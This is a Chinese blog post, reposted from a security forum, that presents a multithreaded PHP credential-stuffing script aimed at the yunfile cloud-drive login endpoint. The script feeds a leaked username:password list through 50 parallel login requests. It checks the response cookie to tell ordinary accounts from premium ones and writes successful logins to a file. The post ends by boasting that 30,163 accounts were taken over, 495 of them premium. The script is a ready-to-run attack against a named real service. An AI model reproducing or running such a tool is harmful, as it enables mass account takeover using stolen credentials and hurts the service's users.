---
title:  yunfile网盘多线程破解
date: 2013-8-20 13:42
tags:
---

文章2013-8-20 13:42 发于[t00ls](https://www.t00ls.net/thread-23935-1-1.html)
引用[rolling-curl](https://github.com/chuyskywalker/rolling-curl)
```php
<?php
/*
参考代码文章:www.searchtb.com/2012/06/rolling-curl-best-practices.html
*/
error_reporting(0); //不显示错误
ini_set('memory_limit',-1); //内存设置最高

/*

 @params $str 输入字符 $type 所需获取编码

*/
function autoiconv($str,$type = "gb2312//ignore"){
    $utf32_big_endian_bom = chr(0x00) . chr(0x00) . chr(0xfe) . chr(0xff);
  $utf32_little_endian_bom = chr(0xff) . chr(0xfe) . chr(0x00) . chr(0x00);
  $utf16_big_endian_bom = chr(0xfe) . chr(0xff);
  $utf16_little_endian_bom = chr(0xff) . chr(0xfe);
  $utf8_bom = chr(0xef) . chr(0xbb) . chr(0xbf);
$first2 = substr($str, 0, 2);
  $first3 = substr($str, 0, 3);
  $first4 = substr($str, 0, 3);
    if ($first3 == $utf8_bom) $icon = 'utf-8';
    elseif ($first4 == $utf32_big_endian_bom) $icon = 'utf-32be';
    elseif ($first4 == $utf32_little_endian_bom) $icon = 'utf-32le';
    elseif ($first2 == $utf16_big_endian_bom) $icon = 'utf-16be';
    elseif ($first2 == $utf16_little_endian_bom) $icon = 'utf-16le';
    else { $icon = 'ascii'; return $str;}
    return iconv($icon,$type,$str);
}

require("./include/RollingCurl.php"); //载入多线程类

$threads=50; //线程
$timeout=10; //设置超时
$dic_file='./dict/user.txt';//设置加载字典文件
$dict=file($dic_file);//设置字典
$count=count($dict);
echo '[info] 载入字典文件:'.$dic_file.PHP_EOL ;
echo '[info] 加载 '.$count.'行字典'.PHP_EOL ;
echo '[info] 线程:'.$threads.PHP_EOL ;
echo '[info] 超时设定:'.$timeout.PHP_EOL ;
usleep(500);
echo '[info] 程序初始化中...'.PHP_EOL ;
 
function request_callback($response, $info, $request) {
$p= $request->post_data;
preg_match('/module\=member&action\=validateLogin&username\=(.*?)&password\=(.*?)&remember\=on/',$p,$mm);
$user=$mm[1];
$pass=$mm[2];

//判断登录状态以及用户权限
if(!preg_match('/^Set-Cookie:[\s]+membership=(\d{1}).*?;+/mi', $response,$match)) {

        echo '[!] 登录失败    '.'用户名:'.str_pad($user,18," ").'密码:'.str_pad($pass,18," ").PHP_EOL;
}else{
$id=$match[1];
$id= intval(trim($id));
if($id==1){$m='普通会员';}
else if($id==2){$m='高级会员';}
else{        $m='未知情况';}
$str= '[*] 登录成功    '.'用户名:'.str_pad($user,18," ").'密码:'.str_pad($pass,18," ").'权限:'.$m.PHP_EOL;
file_put_contents('./log/logins.txt',$str,FILE_APPEND); //保存扫描结果
echo $str;
 }

}
 

$rc = new RollingCurl("request_callback");

$rc->window_size = $threads; //设置线程
$rc->timeout = $timeout; //设置超时
$method='POST';

$u=array('');
$p=array('');
$url='http://www.yunfile.com/view';

foreach ($dict as $k=> $s){
list($u[$k], $p[$k]) = explode(':',trim(autoiconv($s)));
$username=$u[$k];
$password=$p[$k];
$username;
$post_data='module=member&action=validateLogin&username='.$username.'&password='.$password.'&remember=on';
$request = new RollingCurlRequest($url,$method,$post_data); //CURLOPT_FOLLOWLOCATION=>1 自动跳转  为0 不跳转
$request->options = array(CURLOPT_FOLLOWLOCATION => 0,
                        CURLOPT_NOBODY => 1,
                        CURLOPT_HEADER => 1                                                                                                );
  
    $rc->add($request);

}
$rc->execute();

?>
```
![2019-07-19-04-25-40](https://wolvez.oss-cn-hangzhou.aliyuncs.com/f7fbd1c9beda5e74dbee683271c916d8.png)
![2019-07-19-04-25-52](https://wolvez.oss-cn-hangzhou.aliyuncs.com/742129f624db4b0ad1f2d9f2232b8cdb.png)
![2019-07-19-04-26-04](https://wolvez.oss-cn-hangzhou.aliyuncs.com/8dcb1518743f3c7934f8b0049b4b52c3.png)
![2019-07-19-04-26-14](https://wolvez.oss-cn-hangzhou.aliyuncs.com/c9cdcefc02dc36477cfb424982bbced9.png)


加载了某市面上泄露的网盘 700075 行用户密码列表(大小 13mb)成功登录 30163个有效帐号
其中 495个高级会员
耗时 3小时
